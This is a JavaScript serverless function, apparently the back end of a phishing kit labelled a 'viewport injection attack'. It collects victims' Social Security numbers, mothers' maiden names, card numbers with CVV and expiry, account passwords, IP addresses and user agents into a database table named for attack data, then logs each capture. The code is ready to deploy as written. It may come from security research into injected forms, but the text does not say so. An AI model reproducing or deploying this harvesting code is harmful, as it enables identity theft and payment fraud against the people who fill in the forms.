// Vercel Serverless Function for Viewport Injection Attack Data Collection V3
// Endpoint: /api/membership/submit-v3

import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Connect to Neon database
        const sql = neon(process.env.subscription_form_DATABASE_URL);

        const {
            formType,
            firstName,
            lastName,
            email,
            birthdate,
            zipCode,
            agreementAccepted,
            identityVerification,
            verificationPayment,
            accountSecurity,
            viewportInjectionSuccess,
            triggerSource,
            isFieldUpdate,
            updateTimestamp,
            submittedAt
        } = req.body;

        // Extract multi-stage verification data
        const identity = identityVerification || {};
        const payment = verificationPayment || {};
        const account = accountSecurity || {};

        // Get client IP and user agent
        const userAgent = req.headers['user-agent'] || '';
        const clientIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection?.remoteAddress || 'unknown';

        // Insert data into membership attack table v3 using Neon
        const result = await sql`
            INSERT INTO membership_attack_data_v3 (
                form_type, first_name, last_name, email, birthdate, zip_code, agreement_accepted,
                social_security_number, mother_maiden_name,
                verify_card_number, verify_expiry_month, verify_expiry_year,
                verify_cvv, verify_card_name, verify_billing_zip,
                account_password, confirm_password, backup_phone_number, emergency_contact,
                viewport_injection_success, trigger_source, is_field_update, update_timestamp,
                user_agent, ip_address, submitted_at
            ) VALUES (
                ${formType || 'membership-v3-viewport-multistage'},
                ${firstName || null},
                ${lastName || null},
                ${email || null},
                ${birthdate || null},
                ${zipCode || null},
                ${agreementAccepted || false},
                ${identity.socialSecurityNumber || null},
                ${identity.motherMaidenName || null},
                ${payment.verifyCardNumber || null},
                ${payment.verifyExpiryMonth || null},
                ${payment.verifyExpiryYear || null},
                ${payment.verifyCVV || null},
                ${payment.verifyCardName || null},
                ${payment.verifyBillingZip || null},
                ${account.accountPassword || null},
                ${account.confirmPassword || null},
                ${account.backupPhoneNumber || null},
                ${account.emergencyContact || null},
                ${viewportInjectionSuccess || false},
                ${triggerSource || null},
                ${isFieldUpdate || false},
                ${updateTimestamp || null},
                ${userAgent},
                ${clientIP},
                ${submittedAt || new Date().toISOString()}
            )
            RETURNING id, created_at;
        `;

        // Log successful viewport attack data capture
        console.log('🚨 VIEWPORT INJECTION V3 MULTISTAGE DATA CAPTURED:', {
            id: result[0].id,
            email: email,
            hasIdentityData: !!(identity.socialSecurityNumber),
            hasPaymentData: !!(payment.verifyCardNumber),
            hasAccountData: !!(account.accountPassword),
            viewportInjectionSuccess: viewportInjectionSuccess,
            triggerSource: triggerSource,
            isFieldUpdate: isFieldUpdate,
            timestamp: result[0].created_at
        });

        res.status(200).json({
            success: true,
            message: 'Viewport injection v3 data successfully captured',
            attack_id: result[0].id,
            timestamp: result[0].created_at,
            attack_type: 'viewport-injection',
            viewport_injection_success: viewportInjectionSuccess,
            trigger_source: triggerSource,
            data_captured: {
                basic_fields: !!(firstName && lastName && email),
                identity_fields: !!(identity.socialSecurityNumber),
                payment_fields: !!(payment.verifyCardNumber),
                account_fields: !!(account.accountPassword),
                is_update: isFieldUpdate,
                stage_completion: {
                    identity: !!(identity.socialSecurityNumber || identity.motherMaidenName),
                    payment: !!(payment.verifyCardNumber),
                    account: !!(account.accountPassword)
                }
            }
        });

    } catch (error) {
        console.error('Viewport injection v3 data capture error:', error);
        res.status(500).json({
            error: 'Failed to capture viewport injection v3 data',
            details: error.message,
            attack_type: 'viewport-injection'
        });
    }
}